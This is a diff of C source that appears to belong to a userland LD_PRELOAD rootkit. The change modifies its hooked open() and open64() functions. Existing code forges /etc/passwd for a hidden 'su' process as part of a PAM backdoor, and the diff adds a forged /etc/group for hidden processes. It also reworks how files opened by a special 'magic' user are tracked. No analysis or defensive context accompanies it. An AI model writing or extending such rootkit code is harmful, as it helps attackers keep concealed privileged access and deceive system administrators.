@@ -4,17 +4,18 @@ int open(const char *pathname, int flags, mode_t mode){
 #ifdef USE_PAM_BD
     if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
         return fileno(forgepasswd(pathname));
+
+    if(hidden_pid() && !strcmp(pathname, "/etc/group\0"))
+        return fileno(forgegroups(pathname));
 #endif
 
     if(magicusr()){
-#ifdef HIDE_MY_ASS
         int ret = (long)call(COPEN, pathname, flags, mode);
+#ifdef HIDE_MY_ASS
         if(ret && !pathtracked(pathname))
             trackwrite(pathname);
-        return ret;
-#else
-        return (long)call(COPEN, pathname, flags, mode);
 #endif
+        return ret;
     }
 
 #ifdef HIDE_SELF
@@ -80,17 +81,18 @@ int open64(const char *pathname, int flags, mode_t mode){
 #ifdef USE_PAM_BD
     if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
         return fileno(forgepasswd(pathname));
+
+    if(hidden_pid() && !strcmp(pathname, "/etc/group\0"))
+        return fileno(forgegroups(pathname));
 #endif
 
     if(magicusr()){
-#ifdef HIDE_MY_ASS
         int ret = (long)call(COPEN64, pathname, flags, mode);
+#ifdef HIDE_MY_ASS
         if(ret && !pathtracked(pathname))
             trackwrite(pathname);
-        return ret;
-#else
-        return (long)call(COPEN64, pathname, flags, mode);
 #endif
+        return ret;
     }
 
 #ifdef HIDE_SELF
